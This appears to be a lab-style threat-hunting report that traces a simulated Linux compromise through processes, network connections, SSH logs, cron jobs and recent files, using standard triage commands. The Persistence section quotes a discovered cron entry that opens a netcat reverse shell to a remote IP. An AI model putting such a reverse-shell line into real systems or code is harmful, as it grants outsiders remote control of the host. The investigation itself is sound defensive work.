# Threat Hunting Investigation

## Objective

This phase assumes that automated detections failed or were unavailable.

Instead of responding to an alert, the analyst must proactively search the compromised system for evidence of attacker activity.

The goal was to answer:

- Was the system compromised?
- What actions did the attacker perform?
- What artifacts remain?
- What indicators can be used for future detection?

---

# Investigation Methodology

The investigation followed a host and network based threat hunting approach.

Evidence sources reviewed:

- Process information
- Network connections
- SSH authentication records
- Cron configuration
- File system activity
- Packet captures
- System logs

---

# Process Investigation

The first step was identifying unusual processes and command execution.

Commands:

```bash
ps aux

sudo lsof
```

Evidence reviewed:

```
processes.txt
lsof.txt
```

Investigation focused on:

- Unexpected shells
- Network utilities
- Unknown binaries
- Processes running with elevated privileges

Findings:

A malicious shell environment and network-related activity associated with the compromise were identified.

---

# Network Connection Hunting

Active and historical network activity was reviewed.

Commands:

```bash
ss -tulpn

ss -tunap
```

Evidence reviewed:

```
network_connections.txt
attack_capture.pcap
```

Investigation focused on:

- Unexpected outbound connections
- Reverse shell traffic
- Suspicious ports
- Data transfer activity

Findings:

Network activity consistent with command execution and simulated exfiltration was identified.

---

# Login Investigation

Authentication activity was reviewed through journalctl SSH records.

Command:

```bash
journalctl | grep ssh
```

Evidence reviewed:

```
ssh.log
```

Findings:

- Multiple SSH authentication attempts occurred.
- A successful login using the compromised account was identified.
- The account was later used for privilege escalation.

---

# Persistence Hunting

Persistence mechanisms were manually reviewed.

Cron jobs were checked:

```bash
crontab -l

sudo crontab -l
```

Findings:

A suspicious scheduled task was discovered:

```
* * * * * nc -e /bin/sh <remote-ip> 12345
```

This confirmed attacker persistence.

---

# File System Investigation

Sensitive and recently modified files were reviewed.

Commands:

```bash
find / -mtime -1 2>/dev/null

find /tmp -type f

find /var/tmp -type f
```

Investigation focused on:

- Recently created files
- Suspicious archives
- Temporary attacker artifacts

Finding:

The attacker accessed:

```
/root/sensitive-data.7z
```

---

# Threat Hunting Results

| Investigation Area | Result |
|-|-|
| Processes | Suspicious attacker activity identified |
| Network | Malicious connections identified |
| Authentication | Compromised SSH account confirmed |
| Persistence | Cron-based persistence discovered |
| Files | Sensitive archive access confirmed |

---

# Conclusion

Manual threat hunting successfully reconstructed the attack lifecycle without relying on automated alerts.

The investigation identified:

- Initial access method
- Compromised account
- Privilege escalation activity
- Persistence mechanism
- Data collection activity
- Network indicators

The collected artifacts were converted into an IOC list and ATT&CK mapping for future detection development.